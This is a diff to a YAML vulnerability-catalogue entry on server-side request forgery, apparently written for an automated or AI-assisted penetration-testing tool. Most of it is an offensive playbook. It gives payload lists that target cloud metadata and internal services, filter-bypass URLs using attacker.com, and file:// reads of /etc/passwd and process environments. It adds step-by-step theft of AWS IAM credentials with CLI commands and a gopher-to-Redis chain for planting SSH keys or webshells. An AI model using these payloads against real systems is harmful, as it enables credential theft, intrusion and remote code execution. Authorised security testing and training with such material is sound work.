@@ -1,68 +1,105 @@
 id: SSRF
-name: Server-Side Request Forgery
+name: Server-Side Request Forgery — Comprehensive
 cwe:
 - CWE-918
 owasp: A10:2021 SSRF
-severity_range: Medium - Critical
-description: Application fetches a URL provided by the user without proper validation, allowing attackers to make requests
-  to internal services, cloud metadata, or arbitrary external targets.
+severity_range: High - Critical
+description: SSRF lets an attacker force the server to make HTTP/internal requests on their behalf. Used to access internal
+  services, cloud metadata, perform port scans, and bypass IP-based auth. Blind SSRF is common — confirmation requires OOB
+  callback.
 detection:
+  indicators:
+  - URL parameters (url, fetch, redirect, callback, image_url, webhook)
+  - Features that accept URLs (avatar import, RSS reader, webhook config, SSO callbacks)
+  - PDF generators, image processors, link previews
+  - Any parameter accepting fully-qualified URLs
+  strategy:
+  - 1. Set parameter to OOB callback URL — wait for connection
+  - 2. If OOB hits, confirm SSRF
+  - '3. Probe internal hosts: 127.0.0.1, localhost, 10.0.0.0/8, 192.168.0.0/16'
+  - '4. Test cloud metadata: 169.254.169.254 (AWS/GCP/Azure)'
+  - '5. Try alternative protocols: file://, gopher://, dict://, ftp://, ldap://'
+  - 6. Test for SSRF filter bypasses (encoded IPs, DNS rebinding)
   payloads:
-    internal_access:
+    basic_internal:
     - http://127.0.0.1
     - http://localhost
-    - http://0.0.0.0
+    - http://169.254.169.254
     - http://[::1]
+    - http://0.0.0.0
+    cloud_metadata:
+    - http://169.254.169.254/latest/meta-data/  (AWS)
+    - 'http://169.254.169.254/computeMetadata/v1/  (GCP, requires Metadata-Flavor: Google)'
+    - http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)
+    - http://metadata.google.internal/computeMetadata/v1/
+    - http://100.100.100.200/latest/meta-data/  (Alibaba)
+    - http://169.254.169.254/openstack/  (OpenStack)
+    ip_obfuscation:
+    - http://127.1
+    - http://127.0.0.1.nip.io
     - http://0177.0.0.1
     - http://2130706433
-    - http://127.1
-    - http://0x7f000001
-    - http://127.0.0.1:22
-    - http://127.0.0.1:3306
-    - http://127.0.0.1:6379
-    - http://127.0.0.1:8080
-    - http://127.0.0.1:9200
-    cloud_metadata:
-    - http://169.254.169.254/latest/meta-data/
-    - http://169.254.169.254/latest/meta-data/iam/security-credentials/
-    - http://metadata.google.internal/computeMetadata/v1/
-    - http://169.254.169.254/metadata/v1/
-    - http://100.100.100.200/latest/meta-data/
-    protocol_smuggling:
-    - file:///etc/passwd
-    - file:///c:/windows/win.ini
-    - dict://127.0.0.1:6379/info
-    - gopher://127.0.0.1:6379/_INFO%0d%0a
-    - ftp://127.0.0.1
-    dns_rebinding:
-    - http://spoofed.burpcollaborator.net
-    - http://1.attacker-controlled-dns.com
-    bypass_filters:
-    - http://127.0.0.1.nip.io
-    - http://spoofed.burpcollaborator.net
-    - http://127.0.0.1#@attacker.com
-    - http://attacker.com@127.0.0.1
-    - http://127.0.0.1%2523@attacker.com
+    - http://0x7f.0x0.0x0.0x1
     - http://[0:0:0:0:0:ffff:127.0.0.1]
     - http://127。0。0。1
-  strategy:
-  - 1. Identify parameters that accept URLs (url=, redirect=, fetch=, load=, src=, img=, href=)
-  - 2. Test with external callback server (Burp Collaborator or webhook.site)
-  - 3. Test internal IPs starting with 127.0.0.1
-  - 4. Test cloud metadata endpoints (169.254.169.254)
-  - 5. Test alternative IP representations (decimal, hex, octal)
-  - 6. Test protocol handlers (file://, gopher://, dict://)
-  - 7. Check for partial SSRF (can control hostname but not path)
-  - 8. Test for blind SSRF via timing differences or DNS callbacks
-evidence_needed: Server-side request to attacker-controlled server (DNS/HTTP callback), internal service response, or cloud
-  metadata content in response
+    url_parser_confusion:
+    - http://attacker.com#@127.0.0.1/
+    - http://attacker.com@127.0.0.1/
+    - http://127.0.0.1?@attacker.com/
+    - http://attacker.com\@127.0.0.1/
+    - http://127.0.0.1\.attacker.com/
+    alternative_protocols:
+    - file:///etc/passwd
+    - file:///proc/self/environ
+    - gopher://127.0.0.1:6379/_FLUSHALL  (Redis attack via gopher)
+    - dict://127.0.0.1:11211/stats  (memcached)
+    - ldap://127.0.0.1:389/?objectClass=*
+    - ftp://attacker.com/
+    - tftp://attacker.com/
+    - jar:http://attacker.com/exploit.jar!/
+    - ssh2.sftp://...
+    dns_rebinding:
+    - Use a domain that resolves to 1.2.3.4 on first lookup, 127.0.0.1 on second
+    - 'Tools: rbndr.us, lock.cmpxchg8b.com'
+    - 'Bypass: target validates 1st DNS, fetches based on 2nd DNS'
+exploitation:
+  aws_credential_theft:
+  - '1. Fetch IAM role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+  - '2. Fetch credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
+  - 3. Returns AccessKeyId, SecretAccessKey, Token — use with AWS CLI
+  - '4. Enumerate AWS account: aws sts get-caller-identity'
+  - '5. Look for permissions: aws iam list-attached-role-policies --role-name <role>'
+  internal_port_scan:
+  - Iterate http://127.0.0.1:PORT for ports 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017
+  - Response time / error type reveals open vs closed
+  - Build internal service map from responses
+  redis_rce_via_gopher:
+  - gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset...
+  - Set SSH key in /root/.ssh/authorized_keys via Redis SAVE
+  - Or set webshell in webroot
+  internal_admin_access:
+  - Find internal admin URLs from JS bundles, error pages
+  - 'Access via SSRF: http://internal-admin.local/admin'
+  - Bypass IP allowlist (admin only accessible internally)
+filter_bypasses:
+- If 127.0.0.1 blocked, try 0.0.0.0, [::1], 0177.0.0.1, 2130706433
+- If 169.254.169.254 blocked, try fly.io metadata (fly.dev), Alibaba (100.100.100.200)
+- DNS rebinding for time-of-check time-of-use bypasses
+- 'URL parser confusion using @ and # — different libraries parse differently'
+- 'HTTP redirects: target fetches your URL, you redirect to internal'
+- Punycode/unicode bypass for ASCII filters
 ai_research_hints:
-- Check webhook/integration features for SSRF
-- Test URL preview/unfurl features (Slack-style link previews)
-- Check PDF generation with URL-based images
-- Test import/export features that accept URLs
-- Look for SVG rendering with external references
+- Webhook configuration is a high-yield SSRF target — companies often allow arbitrary URLs
+- PDF/screenshot generators (wkhtmltopdf, Puppeteer) make HTTP requests when rendering
+- Image proxies that 'sanitize' images by downloading them are SSRF-prone
+- OAuth callback URLs may be validated but the redirect_uri's final destination is fetched
+- Cloud metadata is the highest-impact target — start there if AWS/GCP/Azure detected
+- If basic SSRF blocked, try DNS rebinding before giving up
+tools:
+- SSRFmap
+- Gopherus (gopher payload generation)
+- OOB callback server
 references:
 - https://portswigger.net/web-security/ssrf
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
-- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
